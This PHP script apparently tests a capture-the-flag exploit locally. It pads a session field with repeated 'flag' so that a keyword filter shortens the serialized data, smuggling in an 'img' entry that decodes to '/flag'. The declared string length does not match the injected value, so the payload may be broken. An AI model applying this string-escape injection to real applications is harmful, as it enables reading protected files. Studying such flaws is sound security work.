<?php
// Test the unserialize locally

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Simulate the session
$_SESSION = [];
$_SESSION['user'] = 'flagflagflagflagflagflagflagflag";s:3:"img";s:20:"L2ZsYWc=";}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = base64_encode('guest_img.png');

echo "Session:\n";
var_dump($_SESSION);

$serialized = serialize($_SESSION);
echo "\nSerialized:\n";
echo $serialized . "\n";

$filtered = filter($serialized);
echo "\nFiltered:\n";
echo $filtered . "\n";

$result = @unserialize($filtered);
echo "\nUnserialized:\n";
var_dump($result);

if ($result !== false && isset($result['img'])) {
    echo "\nImg value: " . $result['img'] . "\n";
    echo "Decoded: " . base64_decode($result['img']) . "\n";
}

